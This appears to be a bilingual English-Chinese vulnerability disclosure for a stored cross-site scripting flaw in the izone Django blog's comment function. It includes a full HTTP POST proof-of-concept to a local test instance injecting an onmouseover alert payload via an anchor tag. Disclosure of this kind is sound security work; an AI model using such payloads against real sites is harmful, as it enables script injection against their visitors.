---
tags:
  - 漏洞公开
---
# izone django blog XSS
*izone django blog跨站脚本*
## Environment
*环境*
https://github.com/Hopetree/izone/releases/tag/lts
![[Pasted image 20241024095806.png]]
## Analysis
*分析*
There is an XSS vulnerability in the article comment function.In \\apps\\comment\\views.py, AddCommintView() does not securely filter user input and renders it directly to the frontend page through templates
*在文章评论功能中,存在XSS漏洞。\\apps\\comment\\views.py中,AddCommentView()对用户的输入没有安全过滤,且通过模板直接渲染到前端页面*
![[Pasted image 20241024093734.png]]

## Verify
*证实*
Users can insert malicious JavaScript code through methods such as onmouseover in tag \<a\>.
*用户可以通过\<a\>标签中onmouseover等方式插入恶意js代码*
![[Pasted image 20241024094327.png]]
```http
POST /comment/add/ HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 156
Origin: http://127.0.0.1:8000
Connection: close
Cookie: csrftoken=T8JvRxLRlmaxcfOXp8lP0LTUlNnThBGVQui9DetHLKoBnhDmJniDL4WwNmqI2468; 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

csrfmiddlewaretoken=1YgUEQKwRbj5XkFMEdD2tEpzI3exjm5mYkPyqxsmhzx98mubYsAQeXsbaChm4Pvz&rep_id=&content=<a+onmouseover="javascript:alert(1)">t</a>&article_id=1
```
![[Pasted image 20241024094410.png]]
